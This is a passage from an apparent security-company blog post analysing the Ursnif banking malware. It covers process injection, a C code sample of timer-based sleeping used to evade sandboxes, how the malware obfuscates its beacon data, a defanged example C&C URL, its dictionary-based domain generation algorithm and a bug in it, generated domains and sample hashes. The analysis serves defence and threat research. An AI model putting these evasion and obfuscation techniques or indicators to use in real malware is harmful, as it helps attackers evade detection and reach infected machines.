<p><span style="color: #333333;">After this change, the thread is resumed until its EIP of the newly created thread reach the ntdll!RtlExitUserThread address, then the thread is set to suspended mode again. The reason all this procedure is happening is because when a thread is created, it doesn’t immediately start at the function given, it requires some initialization functions to be called first, so the original code is waiting for the initialization to complete and then it have a post initialized thread which it can take control of its EIP without worrying.</span></p>
<p><span style="color: #333333;">Thereafter the thread is suspended again, the function original 4 bytes are restored. The new PE itself is injected with NtCreateSection and NtMapViewOfSection, for mapping the new PE to the malware's memory ending with SetThreadContext which with that we are able to change the registers value, specifically EIP - to the new created entry point of the remote process following ResumeThread.</span></p>
<p><span style="color: #333333;">As we've seen before, attackers are building techniques into their tools in order to evade detection by security solutions. One of the techniques exploits sandbox weaknesses by using different sleeping mechanisms. Sandboxing solutions usually run malware samples only for about 2-3 minutes before they move on to the next sample they have in queue. The reason is simply because those kind of solutions are required to keep up with analyzing hundreds of thousands of samples every day. Therefore, for a sandbox time is a very precious resource. Basically, this means that if a malware can stay dormant for this period of time, the sandbox will not recognize its behavior as malicious and will move to the next sample in queue.</span></p>
<p><span style="color: #333333;">Ursnif has recently evolved and changed the sleeping mechanism, trying to evade detection through a unique sleeping API. Earlier versions used Sleep\WaitForSingleObject\WaitForMultipleObjects or similar APIs. Nowadays, a different method coming in hand, Relative sleeping using windows timers. Here is a code example of how to use the Timers API:</span></p>
<table style="border-color: #808080; width: 100%; margin-left: auto; margin-right: auto; background-color: #e6e6e6;" cellspacing="15" cellpadding="15">
<tbody>
<tr style="height: 1692.96px;">
<td style="height: 1692.96px;">#<span style="color: #0000ff;">include</span> &lt;windows.h&gt;<br>#<span style="color: #0000ff;">include</span> &lt;tchar.h&gt;<br><span style="color: #008000;">/* Definitions */</span><br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">SLEEP_TIME</span> (5) <span style="color: #008000;">/* In seconds */</span><br><span style="color: #008000;">/* Macros */</span><br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">NANOSECONDS</span>(nanos) \<br>(((signed __int64)(nanos)) / 100L)<br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">MICROSECONDS</span>(micros) \<br>(((signed __int64)(micros)) * <span style="color: #800080;">NANOSECONDS</span>(1000L))<br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">MILLISECONDS</span>(milli) \<br>(((signed __int64)(milli)) * <span style="color: #800080;">MICROSECONDS</span>(1000L))<br>#<span style="color: #0000ff;">define</span> <span style="color: #800080;">SECONDS</span>(seconds) \<br>(((signed __int64)(seconds)) * <span style="color: #800080;">MILLISECONDS</span>(1000L)) <br><span style="color: #008000;">/* Enumerations */</span><br><span style="color: #0000ff;">typedef enum _E_CODE</span><br>{<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_FAILURE</span> = -1,<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_SUCCESS</span> = 0,<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_TIMER_CREATION</span>,<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_SET_TIMER</span>,<br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #800080;">E_WAIT_EVENT</span>,<br>} <span style="color: #0000ff;">E_CODE</span>;<br><span style="color: #0000ff;">E_CODE SleepingMechanism</span>(DWORD dwSleepTime)<br>{<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Initializations */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; HANDLE hTimer = <span style="color: #800080;">NULL</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; E_CODE tRetVal = <span style="color: #800080;">E_FAILURE</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; FILETIME ftSystemTime = { 0 };<br>&nbsp; &nbsp; &nbsp; &nbsp; LARGE_INTEGER liSystemTime = { 0 };<br>&nbsp; &nbsp; &nbsp; &nbsp; DWORD dwWaitResult = 0;<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Create unnamed timer */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; hTimer = <span style="color: #0000ff;">CreateWaitableTimer</span>(<span style="color: #800080;">NULL</span>, <span style="color: #800080;">FALSE</span>, <span style="color: #800080;">NULL</span>);<br>&nbsp; &nbsp; &nbsp; &nbsp; if (<span style="color: #800080;">NULL</span> == hTimer)<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"CreateWaitableTimer failure: [%d]\n"</span>), <span style="color: #0000ff;">GetLastError</span>());<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #800080;">E_TIMER_CREATION</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto <span style="color: #0000ff;">lblCleanUp</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Get system time */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">GetSystemTimeAsFileTime</span>(&amp;ftSystemTime);<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Add relative time from current time to sleep */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; liSystemTime.HighPart = ftSystemTime.dwHighDateTime;<br>&nbsp; &nbsp; &nbsp; &nbsp; liSystemTime.LowPart = ftSystemTime.dwLowDateTime;<br>&nbsp; &nbsp; &nbsp; &nbsp; liSystemTime.QuadPart += <span style="color: #800080;">SECONDS</span>(dwSleepTime);<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Set timer with an absolute time to sleep */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; if (!<span style="color: #0000ff;">SetWaitableTimer</span>(hTimer, &amp;liSystemTime, 0, <span style="color: #800080;">NULL</span>, <span style="color: #800080;">NULL</span>, <span style="color: #800080;">FALSE</span>))<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"Failed creating waitable timer: [%d]"</span>), <span style="color: #0000ff;">GetLastError</span>());<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #800080;">E_SET_TIMER</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; goto <span style="color: #0000ff;">lblCleanUp</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Waiting for the timer event*/</span><br>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"Sleeping for [%d] seconds\n"</span>), dwSleepTime);<br>&nbsp; &nbsp; &nbsp; &nbsp; dwWaitResult = <span style="color: #0000ff;">WaitForSingleObject</span>(hTimer, <span style="color: #800080;">INFINITE</span>);<br>&nbsp; &nbsp; &nbsp; &nbsp; if (<span style="color: #800080;">WAIT_OBJECT_0</span> != dwWaitResult)<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"WaitForSingleObject failed: [%d]"</span>), dwWaitResult);<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #800080;">E_WAIT_EVENT</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br><span style="color: #008000;">&nbsp; &nbsp; &nbsp; &nbsp; /* Success */</span><br>&nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #800080;">E_SUCCSES</span>;<br><span style="color: #0000ff;">lblCleanUp:</span><br>&nbsp; &nbsp; &nbsp; &nbsp; if (<span style="color: #800080;">NULL</span> != hTimer)<br>&nbsp; &nbsp; &nbsp; &nbsp; {<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">CloseHandle</span>(hTimer);<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hTimer = <span style="color: #800080;">NULL</span>;<br>&nbsp; &nbsp; &nbsp; &nbsp; }<br>return tRetVal;<br>}<br><span style="color: #0000ff;">INT _tmain</span>(DWORD dwArgc, LPTSTR *lpszArgv)<br>{<br>&nbsp; &nbsp; &nbsp; &nbsp; E_CODE tRetVal = <span style="color: #800080;">E_FAILURE</span>;<br><br>&nbsp; &nbsp; &nbsp; &nbsp; tRetVal = <span style="color: #0000ff;">SleepingMechanism</span>(<span style="color: #800080;">SLEEP_TIME</span>);<br>&nbsp; &nbsp; &nbsp; &nbsp; if (<span style="color: #800080;">E_SUCCSES</span> != tRetVal)<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"Failure: [%d]"</span>), (DWORD)tRetVal);<br>&nbsp; &nbsp; &nbsp; &nbsp; else<br>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff;">_tprintf</span>(<span style="color: #800080;">TEXT</span>(<span style="color: #ff6600;">"Success\n"</span>));<br><br>&nbsp; &nbsp; &nbsp; &nbsp; return 0;<br>}</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><span style="color: #333333;"><br><strong><u>The Additional Evasive Techniques and the DGA Flaw<br></u></strong></span><span style="color: #333333;">Once the attacker tool is able to evade the sandbox, it will try to evade network security solutions which are based on communication pattern signatures. Let's examine two such evasive techniques:</span></p>
<p><span style="color: #333333;"><u>Obfuscating the outbound traffic<br></u></span><span style="color: #333333;">The first data sent from the infected machine would start with the following string format:</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><strong>soft=1&amp;version=%u&amp;user=%08x%08x%08x%08x&amp;server=%u&amp;id=%u&amp;crc=%x</strong></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;"><br>After adding the values which represent the machine (will not be discussed in this blog post) to the format string, the malware will xor the original value and move on to base64 encoding. Thereafter removing the "=" padding.<br><br></span></p>
<table style="border-color: #808080; width: 80%; height: 11px; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td>
<p><strong>W+WIpnoUOvyD3ExoGOYmmDu0bmT8a0IQc2p7qTZymZCHt8eu27PEunoWst7LOJNxEVYBinB9iwNBQ6dP+msKM1eHuJg8mb5vu2siAOn72yyGQxwIDyVrNC1VsGTgKilQ5n64xxRm4NMqJxQP8Mw</strong></p>
</td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">Then adding "/" at random offsets of the string, following with changing every unique letter (which doesn’t match [a-zA-Z0-9]) to its hexadecimal format starting with "_". For example the letter "+" hex representation is 2B, and the letter "/" hex representation is 2F, so the output will end up looking like:</span></p>
<table style="width: 80%; border-color: #808080; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><span><strong>W<span style="color: #ff0000;">_2B</span>WIpn<span style="color: #ff0000;">_2F</span>oUOvyD3ExoGOYmmDu0bmT8a0IQc2p7qTZymZCHt8eu27PEunoWst7LOJNxEVYBinB9iwN<span style="color: #ff0000;">_2F</span>BQ6dP<span style="color: #ff0000;">_2B</span>msKM1eHuJg<span style="color: #ff0000;">_2F</span>8mb5vu2siAOn72yyGQxwIDyVrNC1VsGTgKilQ5n64xxRm4NMqJxQP8Mw</strong></span></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">Finally, there is a second call to the function, adding the "/" slash character at random offsets and then the string is complete.</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><strong>W_2BWIpn_2FoUOvyD3ExoGO<span style="color: #ff0000;">/</span>YmmDu0bmT8<span style="color: #ff0000;">/</span>a0IQc2p7qTZymZCHt<span style="color: #ff0000;">/</span>8eu27PEunoWs<span style="color: #ff0000;">/</span>t7LOJNxEVYB<span style="color: #ff0000;">/</span>inB9iwN_2FBQ6d<span style="color: #ff0000;">/</span>P_2BmsKM1eHuJg_2F8mb5<span style="color: #ff0000;">/</span>vu2siAOn72yyGQxw<span style="color: #ff0000;">/</span>IDyVrNC1VsGTgKi<span style="color: #ff0000;"></span>lQ5n64xxRm4NMqJxQP<span style="color: #ff0000;">/</span>8Mw</strong></td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">This is sent to the C&amp;C server with the following format:</span><br><span style="color: #333333;">"&lt;Domain&gt;/images/&lt;CraftedBase64Url&gt;.gif"<br></span><span style="color: #333333;">where the &lt;Domain&gt; will be chosen by the DGA algorithm, and the &lt;CraftedBase64Url&gt; is what we just created.</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><strong><span style="color: #ff0000;">http://thiscrevmscllevelfak[.]club/images/</span>W_2BWIpn_2FoUOvyD3ExoGO/YmmDu0bmT8/a0IQc2p7qTZymZCHt/8eu27PEunoWs/t7LOJNxEVYB/inB9iwN_2FBQ6d/P_2BmsKM1eHuJg_2F8mb5vu2siAOn72yyGQxw/IDyVrNC1VsGTgKi/lQ5n64xxRm4NMqJxQP/8Mw<span style="color: #ff0000;">.gif</span></strong></td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><span style="background-color: #ccffff;"><span style="color: #ff0000;"></span></span><span style="color: #333333;"><u>Domain Generation Algorithm (DGA)<br></u></span><span style="color: #333333;">When I first reverse engineered the DGA and tried to recreate it using Python, for some reason my code didn’t work as expected and I got different results compared to the actual domains used by the attackers. When I reversed everything slowly and made sure my code does exactly what it is supposed to – I found out that they have some logical flaw in the code. Whether this was intentional or not, I will let you be the judge. But I am pretty sure it was unintentional. Let's see what exactly is going on in there step by step:</span></p>
<p><span style="color: #333333;"><u>Step One</u>:</span><br><span style="color: #333333;">Download a predefined wordlist from an online text file.</span><br><span style="color: #333333;">In python that would be as easy as using urllib2.urlopen.</span></p>
<p><span style="color: #333333;"><u>Step Two</u>:</span><br><span style="color: #333333;">Obtain all the words that are at least 3 letters long. In python that would be: " <span style="background-color: #cccccc;">re.findall("[a-zA-Z]{3,}", data)</span> "</span></p>
<p><span style="color: #333333;"><u>Step Three</u>:</span><br><span style="color: #333333;">Add a null termination (0x00) after every word that matched, in the original buffer.</span></p>
<p><span style="color: #333333;"><u>Step Four</u>:</span><br><span style="color: #333333;">Override the original data with the matching words, after every word add space bar.</span><br><span style="font-size: 14px; color: #333333;"><strong>(Author comments</strong>: This is necessarily shorter than the original buffer so it should potentially work, but in general this is very bad code.)</span></p>
<p><span style="color: #333333;"><u>Step Five</u>:</span><br><span style="color: #333333;">Create the domain using the strings in the buffer list of Step Three.</span></p>
<p><span style="color: #333333;">Now, the problem exists at Step Four, let's take a look at the assembly:</span></p>
<p><span style="color: #333333;"><img src="http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=677&amp;height=566&amp;name=IdaDump.jpg" alt="" title="IdaDump.jpg" width="677" height="566" style="display: block; margin-left: auto; margin-right: auto;" srcset="http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=339&amp;height=283&amp;name=IdaDump.jpg 339w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=677&amp;height=566&amp;name=IdaDump.jpg 677w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=1016&amp;height=849&amp;name=IdaDump.jpg 1016w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=1354&amp;height=1132&amp;name=IdaDump.jpg 1354w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=1693&amp;height=1415&amp;name=IdaDump.jpg 1693w, http://www.seculert.com/hs-fs/hubfs/IdaDump.jpg?t=1475190447323&amp;width=2031&amp;height=1698&amp;name=IdaDump.jpg 2031w" sizes="(max-width: 677px) 100vw, 677px"></span></p>
<p><span style="color: #333333;">To understand the problem better, let's have a dummy buffer to demonstrate the issue.</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; table-layout: fixed; word-wrap: break-word;">
<tbody>
<tr>
<td><strong>Match-Another se cu DEADBEEF le rt</strong></td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;"><br>Applying the regex from Step Two would result in the following word list:</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; word-wrap: break-word; table-layout: fixed;">
<tbody>
<tr>
<td><strong>["Match", "Another", "DEADBEEF"]</strong></td>
</tr>
</tbody>
</table>
<p><span style="background-color: #ccffff;"><strong><br></strong></span><span style="color: #333333;">Adding the null termination on the original string will make it look like:</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; word-wrap: break-word; table-layout: fixed;">
<tbody>
<tr>
<td><strong>Match\x00Another\x00se cu DEADBEEF\x00le rt</strong></td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">After that, we are going to copy each of those strings, override the original buffer with them, and add a space bar right after. This should result the matching strings being one after another ordered in that buffer. However, the first copy is the reason for the problem. We are first of all copying the original word over itself using 'lstrcpy', resulting in the same buffer.</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; word-wrap: break-word; table-layout: fixed;">
<tbody>
<tr>
<td><strong>Match\x00Another\x00se cu DEADBEEF\x00le rt</strong></td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">But after that, we are using 'lstrcat' to add a space after the word. The MSDN documentation of `lstrcat` states:</span> <strong>“lpString1 must be large enough to add lpString2 and the closing '\0'</strong><span style="color: #333333;">,” which means that there are going to be two more bytes added! One of them is the space, and the other one is the null termination coming right after, resulting in the following problem:</span></p>
<table style="border-color: #808080; width: 80%; margin-left: auto; margin-right: auto; background-color: #e6e6e6; word-wrap: break-word; table-layout: fixed;">
<tbody>
<tr>
<td><strong>Match \x00nother\x00se cu DEADBEEF\x00le rt</strong></td>
</tr>
</tbody>
</table>
<p><br><span style="color: #333333;">As you can see, it overwrote some of the next word, which will eventually make it “lose” one of the words in the list making the whole wordlist short by one essentially affecting all of the DGA.</span></p>
<p><span style="font-size: 14px; color: #333333;"><strong>(Author Comments</strong>: I believe the malware authors have no idea they have such a bug in their code because they are probably using the exact same piece of code to know which domains they should buy.)</span></p>
<p><span style="color: #333333;">After I successfully reversed the DGA algorithm and could recreate it myself, we sinkholed one of the generated domains for the next domains cycle, and managed to find pretty interesting statistics about this family over a period of 5 days:</span></p>
<p>&nbsp;</p>
<table style="border-color: #e6e6e6; width: 100%; margin-left: auto; margin-right: auto;">
<thead>
<tr style="text-align: center; height: 21px; background-color: #808080;">
<td style="height: 21px; width: 34%;" colspan="2"><strong><span style="color: #ffffff;">DGA Characteristics</span></strong><span style="color: #ffffff;"></span></td>
<td style="height: 21px; width: 150%; background-color: #ffffff;">&nbsp;</td>
</tr>
</thead>
<tbody>
<tr style="height: 21px;">
<td style="height: 21px; width: 15.9663%;">Type</td>
<td style="height: 21px; width: 18.0337%;">Dictionary based</td>
<td style="height: 99px; width: 150%;" rowspan="6"><img src="http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=528&amp;name=ChartClean.png" title="ChartClean.png" width="528" srcset="http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=264&amp;name=ChartClean.png 264w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=528&amp;name=ChartClean.png 528w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=792&amp;name=ChartClean.png 792w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=1056&amp;name=ChartClean.png 1056w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=1320&amp;name=ChartClean.png 1320w, http://www.seculert.com/hs-fs/hubfs/ChartClean.png?t=1475190447323&amp;width=1584&amp;name=ChartClean.png 1584w" sizes="(max-width: 528px) 100vw, 528px"></td>
</tr>
<tr style="height: 10px;">
<td style="height: 10px; width: 15.9663%;">Seed</td>
<td style="height: 10px; width: 18.0337%;">Current date</td>
</tr>
<tr style="height: 5px;">
<td style="width: 15.9663%; height: 5px;">Change frequency</td>
<td style="width: 18.0337%; height: 5px;">5 days period</td>
</tr>
<tr style="height: 21px;">
<td style="height: 21px; width: 15.9663%;">Domains per cycle</td>
<td style="height: 21px; width: 18.0337%;">15</td>
</tr>
<tr style="height: 21px;">
<td style="height: 21px; width: 15.9663%;">Top level domains</td>
<td style="height: 21px; width: 18.0337%;">.ru, .xyz, .club</td>
</tr>
<tr style="height: 21px;">
<td style="height: 21px; width: 15.9663%;">Total infected machines</td>
<td style="height: 21px; width: 18.0337%;">6,893</td>
</tr>
</tbody>
</table>
<p><span style="color: #333333;">On the analyzed sample, the DGA's dictionary (word list) is generated from this url: </span><br><span style="color: #333333;"><a href="http://opensource.apple.com/source/Security/Security-29/SecureTransport/LICENSE.txt" style="color: #333333;">http://opensource.apple.com/source/Security/Security-29/SecureTransport/LICENSE.txt</a></span></p>
<p><span style="color: #333333;">The interesting part of this DGA is the fact it can change the file from which the wordlist is generated, thus making it very easy to create different versions of the DGA for different purposes.</span></p>
<p><span style="color: #333333;">An example of actual domains generated from the dictionary:</span></p>
<p><span style="color: #444444;"><span>•</span> thiscrevmscllevelfak.club </span><br><span style="color: #444444;"><span>•</span> levelignorethenind.ru </span><br><span style="color: #444444;"><span>•</span> mtabaddresslocked.xyz </span><br><span style="color: #444444;"><span>•</span> consseriflistyleleft.club </span><br><span style="color: #444444;"><span>•</span> aresymbolparamspan.ru </span><br><span style="color: #444444;"><span>•</span> respondslemsonmsonum.club </span><br><span style="color: #444444;"><span>•</span> senddatalistenpython.xyz </span><br><span style="color: #444444;"><span>•</span> numfalseandyspan.ru </span><br><span style="color: #444444;"><span>•</span> maxsemihiddenmsosymbol.club </span><br><span style="color: #444444;"><span>•</span> cllockedlevelnbsple.club </span><br><span style="color: #444444;"><span>•</span> nbspserliststthelist.xyz </span><br><span style="color: #444444;"><span>•</span> symbolcontacttype.ru </span><br><span style="color: #444444;"><span>•</span> intoaddedprio.ru </span><br><span style="color: #444444;"><span>•</span> stylesendnblisprestval.xyz </span><br><span style="color: #444444;"><span>•</span> indentlspthatmcan.ru</span></p>
<p><span style="color: #444444;">Analyzed Samples:</span><br><span style="color: #444444;"><span>•</span> 9b38f10fd425b37115c81ad07598d930<br><span>•</span> b60c97d22f0ae301e916d61f79162b78<br><span>•</span> f50bd1585f601d41244c7e525b8bd96a</span></p>
<p style="text-align: center;"><span style="color: #333333;"># # #</span></p>
<p style="text-align: left;"><span>To see if Ursnif or other malware has&nbsp;bypassed your firewall rules or gateway without alerting you or blocking them altogether, we suggest you run the&nbsp;<a href="http://www.seculert.com/seculert-javelin" target="_blank">Seculert Javelin</a> Simulation Test. You may be surprised what it finds hiding in most networks.</span></p>
                    <p></p>
                    
                 </div>
                 <p class="an-link-social an-link-socials-content">
                    <a href="https://www.facebook.com/Seculert" title="Like Facebook"><img src="/hubfs/NewSeculertImages/blog/like-face.png"></a>
                    <a href="https://twitter.com/seculert" title="Like Twitter"><img src="/hubfs/NewSeculertImages/blog/like-twitter.png"></a>
                 </p>
            </div>
            
            
            
            <div class="col s12 m4 l3">
                <div class="an-sidebar">
                    <div class="an-widget">
                        <h3>categories</h3>
                        <ul class="an-category">
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/in-the-media" title=""><i class="material-icons">chevron_right</i> In the Media <span>&nbsp;(82)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/news-media" title=""><i class="material-icons">chevron_right</i> News &amp; Media <span>&nbsp;(82)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/resources-cat" title=""><i class="material-icons">chevron_right</i> Resources <span>&nbsp;(17)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/press-releases" title=""><i class="material-icons">chevron_right</i> Press Releases <span>&nbsp;(12)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/webinars" title=""><i class="material-icons">chevron_right</i> Webinars <span>&nbsp;(9)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/blogs" title=""><i class="material-icons">chevron_right</i> Blog <span>&nbsp;(4)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/white-papers" title=""><i class="material-icons">chevron_right</i> White Papers <span>&nbsp;(4)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/reports" title=""><i class="material-icons">chevron_right</i> Reports <span>&nbsp;(3)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/2015" title=""><i class="material-icons">chevron_right</i> 2015 <span>&nbsp;(2)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/events" title=""><i class="material-icons">chevron_right</i> Events <span>&nbsp;(2)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/product" title=""><i class="material-icons">chevron_right</i> Product <span>&nbsp;(2)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/451-report" title=""><i class="material-icons">chevron_right</i> 451 Report <span>&nbsp;(1)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/black-hat-security-analytics" title=""><i class="material-icons">chevron_right</i> Black Hat, Security Analytics <span>&nbsp;(1)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/brochures-and-datasheets" title=""><i class="material-icons">chevron_right</i> Brochures &amp; Datasheets <span>&nbsp;(1)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/gateway-attack-detection" title=""><i class="material-icons">chevron_right</i> Gateway Attack Detection <span>&nbsp;(1)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/in-the-news" title=""><i class="material-icons">chevron_right</i> In the News <span>&nbsp;(1)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/javelin" title=""><i class="material-icons">chevron_right</i> Javelin <span>&nbsp;(1)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/javelin-attack-simulator" title=""><i class="material-icons">chevron_right</i> Javelin Attack Simulator <span>&nbsp;(1)</span></a>
                            </li>
                            
                        
                            
                            
                            <li>
                                <a href="http://www.seculert.com/blogs/topic/uncategorized" title=""><i class="material-icons">chevron_right</i> Uncategorized <span>&nbsp;(1)</span></a>
                            </li>
                            
                        
                        </ul>
                    </div>
                    <div class="an-widget" style="display:none;">
                        <h3>social widget</h3>
                        <p class="an-link-social">
                            <a href="https://www.facebook.com/Seculert" title="Like Facebook"><img src="/hubfs/NewSeculertImages/blog/like-face.png"></a>
                            <a href="https://twitter.com/seculert" title="Like Twitter"><img src="/hubfs/NewSeculertImages/blog/like-twitter.png"></a>
                        </p>
                    </div>
                    <div class="an-widget">
                        <h3>recent post</h3>
                        <ul class="an-recent-post">
                        
                        
                            <li>
                                <div class="item-post">
                                    <div class="an-image">
                                        
                                    </div>
                                    <div class="an-content-des">
                                        <p>Ursnif: Deep Technical Dive</p>
                                        <a href="http://www.seculert.com/blogs/ursnif-deep-technical-dive" title="">Aug 30, 2016 4:23:13 PM</a> 
                                    </div> 
                                </div>
                            </li>
                        
                            <li>
                                <div class="item-post">
                                    <div class="an-image">
                                        
                                    </div>
                                    <div class="an-content-des">
                                        <p>Possible Nation State Attackers ProjectSauron to Covertly Eavesdrop on Government Organizations</p>
                                        <a href="http://www.seculert.com/blogs/possible-nation-state-attackers-projectsauron-to-covertly-eavesdrop-on-government-organizations" title="">Aug 19, 2016 1:33:51 PM</a> 
                                    </div> 
                                </div>
                            </li>
                        
                            <li>
                                <div class="item-post">
                                    <div class="an-image">
                                        
                                    </div>
                                    <div class="an-content-des">
                                        <p>Security Analytics: A "Top Four" Topic At Black Hat</p>
                                        <a href="http://www.seculert.com/blogs/security-analytics-a-top-four-topic-at-black-hat" title="">Aug 8, 2016 6:28:47 PM</a> 
